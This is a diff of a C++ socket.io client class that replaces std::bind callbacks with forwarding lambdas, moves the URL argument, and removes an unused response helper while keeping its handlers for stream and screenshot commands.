@@ -6,19 +6,22 @@
 
 namespace silence
 {
-    Client::Client(const std::string &url)
-        : mUrl(url), mIO(new sio::client())
+    Client::Client(std::string url)
+        : mUrl(std::move(url)), mIO(new sio::client())
     {
-        using namespace std::placeholders;
         mSocket = mIO->socket();
 
         // bind events
-        mSocket->on("command", std::bind(&Client::onCommand,
-                                         this, _1, _2, _3, _4));
+        mSocket->on("command", [this](auto &&PH1, auto &&PH2, auto &&PH3, auto &&PH4)
+                    { onCommand(std::forward<decltype(PH1)>(PH1), std::forward<decltype(PH2)>(PH2), std::forward<decltype(PH3)>(PH3),
+                                std::forward<decltype(PH4)>(PH4)); });
 
-        mIO->set_socket_open_listener(std::bind(&Client::onConnected, this, _1));
-        mIO->set_close_listener(std::bind(&Client::onClosed, this, _1));
-        mIO->set_fail_listener(std::bind(&Client::onFailed, this));
+        mIO->set_socket_open_listener([this](auto &&PH1)
+                                      { onConnected(std::forward<decltype(PH1)>(PH1)); });
+        mIO->set_close_listener([this](auto &&PH1)
+                                { onClosed(std::forward<decltype(PH1)>(PH1)); });
+        mIO->set_fail_listener([this]
+                               { onFailed(); });
     }
 
     Client::~Client()
@@ -59,7 +62,7 @@ namespace silence
     Client::createObject(const CommandObject &object)
     {
         auto obj = sio::object_message::create();
-        obj.get()->get_map() = object;
+        obj->get_map() = object;
         return obj;
     }
 
@@ -71,29 +74,19 @@ namespace silence
         thread.detach();
     }
 
-    void Client::sendResponse(bool variable, const std::string &event,
-                              const std::string &errorMsg,
-                              const std::string &infoMsg)
-    {
-        if (!variable)
-            error(event, errorMsg);
-        else
-            info(infoMsg);
-    }
-
     void Client::onCommand(std::string const &name,
                            sio::message::ptr const &data,
                            bool hasAck,
                            sio::message::list &ack_resp)
     {
-        using namespace std::placeholders;
         auto commandObject = data->get_map();
         std::string event = commandObject["event"]->get_string();
 
         if (event == "greet")
             greetEvent();
         else if (event == "start_stream")
-            launchEvent<void()>(std::bind(&Client::startStreamEvent, this)); // launch in new thread
+            launchEvent<void()>([this]
+                                { startStreamEvent(); }); // launch in new thread
         else if (event == "kill_stream")
             killStreamEvent();
         else if (event == "screenshot")
